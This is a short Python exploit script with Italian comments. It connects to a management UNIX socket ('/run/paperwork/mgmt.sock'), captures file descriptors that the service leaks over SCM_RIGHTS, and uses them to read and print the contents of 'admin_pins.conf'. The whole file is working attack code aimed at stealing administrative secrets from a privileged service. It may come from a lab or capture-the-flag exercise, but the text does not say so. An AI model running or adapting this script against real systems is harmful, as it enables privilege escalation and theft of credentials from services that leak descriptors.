import socket
import os
import array

def leak_descriptors():
    socket_path = "/run/paperwork/mgmt.sock"
    
    print("[*] Connessione al socket UNIX...")
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(socket_path)
    
    # Prepariamo lo spazio per ricevere i dati ancillari (i file descriptor)
    # 2 file descriptor di tipo int = array di 2 elementi
    fds = array.array("i")
    msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_LEN(fds.itemsize * 2))
    
    print(f"[+] Messaggio ricevuto: {msg.decode().strip()}")
    
    # Estraiamo i file descriptor dai dati ancillari
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
            # Popoliamo l'array con i descrittori reali ricevuti dal kernel
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
            
    if len(fds) >= 2:
        log_fd = fds[0]
        admin_fd = fds[1]
        print(f"[+] File Descriptor ricevuti! Log FD: {log_fd}, Admin FD: {admin_fd}")
        
        # Leggiamo direttamente dal file descriptor ereditato
        print("\n=== CONTENUTO DI admin_pins.conf ===")
        contenuto = os.pread(admin_fd, 1024, 0).decode()
        print(contenuto)
        print("=====================================\n")
    else:
        print("[-] Non sono stati ricevuti abbastanza File Descriptor. Il sistema era pulito?")
        
    s.close()

if __name__ == "__main__":
    leak_descriptors()
